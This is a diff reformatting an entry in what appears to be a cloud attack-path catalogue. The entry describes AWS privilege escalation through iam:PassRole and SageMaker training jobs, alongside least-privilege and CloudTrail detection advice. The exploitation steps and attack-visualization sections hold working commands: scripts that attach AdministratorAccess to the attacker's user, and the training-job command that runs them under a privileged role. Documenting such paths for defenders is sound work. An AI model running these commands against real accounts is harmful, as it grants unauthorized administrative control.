@@ -19,7 +19,15 @@ prerequisites:
 exploitationSteps:
   awscli:
   - step: 1
-    command: "echo '#!/usr/bin/env python3\nimport boto3\niam = boto3.client(\"iam\")\niam.attach_user_policy(\n    UserName=\"YOUR_USERNAME\",\n    PolicyArn=\"arn:aws:iam::aws:policy/AdministratorAccess\"\n)\n' > exploit.py\n"
+    command: |
+      echo '#!/usr/bin/env python3
+      import boto3
+      iam = boto3.client("iam")
+      iam.attach_user_policy(
+          UserName="YOUR_USERNAME",
+          PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
+      )
+      ' > exploit.py
     description: Create a malicious training script that attaches AdministratorAccess policy to your user
   - step: 2
     command: '# Package the script as required by SageMaker
@@ -31,12 +39,47 @@ exploitationSteps:
       '
     description: Package and upload the malicious script to S3 (SageMaker requires tar.gz format)
   - step: 3
-    command: "aws sagemaker create-training-job \\\n  --training-job-name privesc-training \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \\\n  --algorithm-specification '{\"TrainingImage\":\"763104351884.dkr.ecr.REGION.amazonaws.com/pytorch-training:2.0.0-cpu-py310\",\"TrainingInputMode\":\"File\"}' \\\n  --input-data-config '[{\"ChannelName\":\"training\",\"DataSource\":{\"S3DataSource\":{\"S3DataType\":\"S3Prefix\",\"S3Uri\":\"s3://BUCKET_NAME\",\"S3DataDistributionType\":\"FullyReplicated\"}}}]' \\\n  --output-data-config '{\"S3OutputPath\":\"s3://BUCKET_NAME/output\"}' \\\n  --resource-config '{\"InstanceType\":\"ml.m5.large\",\"InstanceCount\":1,\"VolumeSizeInGB\":10}' \\\n  --stopping-condition '{\"MaxRuntimeInSeconds\":600}' \\\n  --hyper-parameters '{\"sagemaker_program\":\"exploit.py\",\"sagemaker_submit_directory\":\"s3://BUCKET_NAME/sourcedir.tar.gz\"}'\n"
+    command: |
+      aws sagemaker create-training-job \
+        --training-job-name privesc-training \
+        --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
+        --algorithm-specification '{"TrainingImage":"763104351884.dkr.ecr.REGION.amazonaws.com/pytorch-training:2.0.0-cpu-py310","TrainingInputMode":"File"}' \
+        --input-data-config '[{"ChannelName":"training","DataSource":{"S3DataSource":{"S3DataType":"S3Prefix","S3Uri":"s3://BUCKET_NAME","S3DataDistributionType":"FullyReplicated"}}}]' \
+        --output-data-config '{"S3OutputPath":"s3://BUCKET_NAME/output"}' \
+        --resource-config '{"InstanceType":"ml.m5.large","InstanceCount":1,"VolumeSizeInGB":10}' \
+        --stopping-condition '{"MaxRuntimeInSeconds":600}' \
+        --hyper-parameters '{"sagemaker_program":"exploit.py","sagemaker_submit_directory":"s3://BUCKET_NAME/sourcedir.tar.gz"}'
     description: Create a training job with the privileged role that executes the malicious script via hyperparameters
   - step: 4
     command: aws sagemaker describe-training-job --training-job-name privesc-training
     description: Monitor the training job status and wait for execution
-recommendation: "High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.\n\n- **Avoid administrative service roles** - Very rarely does a SageMaker training job need administrative access. Use the principle of least privilege.\n- **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.\n\nUse IAM policy conditions to restrict which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\": \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificSageMakerRole\",\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"sagemaker.amazonaws.com\"\n    }\n  }\n}\n```\n\n- Monitor CloudTrail for unusual SageMaker training job creation followed by immediate execution\n- Monitor CloudTrail for training job creation by principals who do not usually create training jobs\n- Monitor CloudTrail for roles being passed to SageMaker that haven't been used before\n- Monitor and alert on SageMaker training job creation with privileged roles\n- Regularly audit SageMaker training jobs for excessive IAM permissions\n- Regularly audit all IAM roles that trust the SageMaker service and down-scope any roles with administrative access\n"
+recommendation: |
+  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid administrative service roles** - Very rarely does a SageMaker training job need administrative access. Use the principle of least privilege.
+  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.
+
+  Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificSageMakerRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "sagemaker.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  - Monitor CloudTrail for unusual SageMaker training job creation followed by immediate execution
+  - Monitor CloudTrail for training job creation by principals who do not usually create training jobs
+  - Monitor CloudTrail for roles being passed to SageMaker that haven't been used before
+  - Monitor and alert on SageMaker training job creation with privileged roles
+  - Regularly audit SageMaker training jobs for excessive IAM permissions
+  - Regularly audit all IAM roles that trust the SageMaker service and down-scope any roles with administrative access
 limitations: 'This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks or access to sensitive data.
 
   '
@@ -140,7 +183,31 @@ attackVisualization:
   - from: start
     to: training_job
     label: iam:PassRole + sagemaker:CreateTrainingJob
-    description: "The attacker creates a new SageMaker training job and passes a privileged role to it. The training job is configured with a malicious training script (uploaded to S3) or a custom container image that will execute code to escalate privileges.\n\nCommands:\n```bash\n# Create malicious training script\necho '#!/bin/bash\naws iam attach-user-policy --user-name attacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n' > exploit.sh && chmod +x exploit.sh\n\n# Upload to S3\naws s3 cp exploit.sh s3://BUCKET_NAME/exploit/exploit.sh\n\n# Create training job with privileged role\naws sagemaker create-training-job \\\n  --training-job-name privesc-training \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \\\n  --algorithm-specification TrainingImage=IMAGE_URI,TrainingInputMode=File \\\n  --input-data-config '[{\"ChannelName\":\"training\",\"DataSource\":{\"S3DataSource\":{\"S3DataType\":\"S3Prefix\",\"S3Uri\":\"s3://BUCKET_NAME/exploit/\"}}}]' \\\n  --output-data-config S3OutputPath=s3://BUCKET_NAME/output \\\n  --resource-config InstanceType=ml.m5.large,InstanceCount=1,VolumeSizeInGB=10 \\\n  --stopping-condition MaxRuntimeInSeconds=1800\n```\n\nThe training job will automatically start and execute the malicious code.\n"
+    description: |
+      The attacker creates a new SageMaker training job and passes a privileged role to it. The training job is configured with a malicious training script (uploaded to S3) or a custom container image that will execute code to escalate privileges.
+
+      Commands:
+      ```bash
+      # Create malicious training script
+      echo '#!/bin/bash
+      aws iam attach-user-policy --user-name attacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+      ' > exploit.sh && chmod +x exploit.sh
+
+      # Upload to S3
+      aws s3 cp exploit.sh s3://BUCKET_NAME/exploit/exploit.sh
+
+      # Create training job with privileged role
+      aws sagemaker create-training-job \
+        --training-job-name privesc-training \
+        --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
+        --algorithm-specification TrainingImage=IMAGE_URI,TrainingInputMode=File \
+        --input-data-config '[{"ChannelName":"training","DataSource":{"S3DataSource":{"S3DataType":"S3Prefix","S3Uri":"s3://BUCKET_NAME/exploit/"}}}]' \
+        --output-data-config S3OutputPath=s3://BUCKET_NAME/output \
+        --resource-config InstanceType=ml.m5.large,InstanceCount=1,VolumeSizeInGB=10 \
+        --stopping-condition MaxRuntimeInSeconds=1800
+      ```
+
+      The training job will automatically start and execute the malicious code.
   - from: training_job
     to: target_role
     label: Training job assumes role
